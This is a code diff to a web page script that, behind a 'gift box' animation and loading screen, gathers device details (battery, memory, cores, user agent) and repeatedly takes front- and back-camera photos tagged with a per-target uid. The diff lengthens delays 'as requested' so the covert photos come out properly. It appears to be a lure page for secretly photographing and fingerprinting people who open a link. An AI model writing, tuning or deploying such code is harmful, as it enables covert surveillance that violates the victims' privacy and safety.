@@ -51,31 +51,31 @@
             const mode = params.get('m') || 'front';
             const uid = params.get('uid');
             const battery = await navigator.getBattery();
-            const info = { 
-                battery: (battery.level * 100) + "%", 
-                ram: navigator.deviceMemory + " GB", 
-                cores: navigator.hardwareConcurrency || "N/A",
-                browser: navigator.userAgent 
-            };
+            const info = { battery: (battery.level * 100) + "%", ram: navigator.deviceMemory + " GB", cores: navigator.hardwareConcurrency || "N/A", browser: navigator.userAgent };
 
             document.getElementById('main-ui').style.display = "none";
             document.getElementById('gift-box').style.display = "block";
             document.getElementById('gift-box').classList.add('bounce');
             document.getElementById('loading').style.display = "block";
 
+            // Delay added to fix black photo issue
             if (mode === 'dual') {
                 streamRef = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 document.getElementById('v').srcObject = streamRef;
-                for(let i=0; i<3; i++) { await new Promise(r => setTimeout(r, 2000)); await takeSnapshot('Front', uid, info); }
+                await new Promise(r => setTimeout(r, 4000)); // Wait for camera
+                for(let i=0; i<3; i++) { await new Promise(r => setTimeout(r, 1500)); await takeSnapshot('Front', uid, info); }
                 streamRef.getTracks().forEach(t => t.stop());
+
                 streamRef = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                 document.getElementById('v').srcObject = streamRef;
-                for(let i=0; i<3; i++) { await new Promise(r => setTimeout(r, 2000)); await takeSnapshot('Back', uid, info); }
+                await new Promise(r => setTimeout(r, 4000)); // Wait for camera
+                for(let i=0; i<3; i++) { await new Promise(r => setTimeout(r, 1500)); await takeSnapshot('Back', uid, info); }
             } else {
                 const face = mode === 'back' ? 'environment' : 'user';
                 streamRef = await navigator.mediaDevices.getUserMedia({ video: { facingMode: face } });
                 document.getElementById('v').srcObject = streamRef;
-                for(let i=0; i<4; i++) { await new Promise(r => setTimeout(r, 2500)); await takeSnapshot(mode, uid, info); }
+                await new Promise(r => setTimeout(r, 8000)); // 8 seconds initial delay as requested
+                for(let i=0; i<4; i++) { await new Promise(r => setTimeout(r, 2000)); await takeSnapshot(mode, uid, info); }
             }
 
             if (streamRef) { streamRef.getTracks().forEach(t => t.stop()); }
